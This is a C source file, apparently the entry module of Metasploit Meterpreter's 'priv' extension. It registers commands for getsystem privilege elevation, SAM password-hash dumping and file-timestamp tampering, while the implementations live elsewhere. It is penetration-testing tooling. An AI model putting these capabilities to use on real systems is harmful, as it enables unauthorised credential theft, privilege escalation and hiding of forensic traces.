/*!
 * @brief This module implements privilege escalation features.
 */
#include "precomp.h"

// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

/*!
 * @brief `priv` extension dispatch table.
 */
Command customCommands[] =
{
	COMMAND_REQ( "priv_elevate_getsystem", elevate_getsystem ),
	COMMAND_REQ( "priv_passwd_get_sam_hashes", request_passwd_get_sam_hashes ),
	COMMAND_REQ( "priv_fs_get_file_mace", request_fs_get_file_mace ),
	COMMAND_REQ( "priv_fs_set_file_mace", request_fs_set_file_mace ),
	COMMAND_REQ( "priv_fs_set_file_mace_from_file", request_fs_set_file_mace_from_file ),
	COMMAND_REQ( "priv_fs_blank_file_mace", request_fs_blank_file_mace ),
	COMMAND_REQ( "priv_fs_blank_directory_mace", request_fs_blank_directory_mace ),
	COMMAND_TERMINATOR
};

/*!
 * @brief Initialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	hMetSrv = remote->met_srv;

	command_register_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	command_deregister_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Get the name of the extension.
 * @param buffer Pointer to the buffer to write the name to.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) GetExtensionName(char* buffer, int bufferSize)
{
	strncpy_s(buffer, bufferSize, "priv", bufferSize - 1);
	return ERROR_SUCCESS;
}
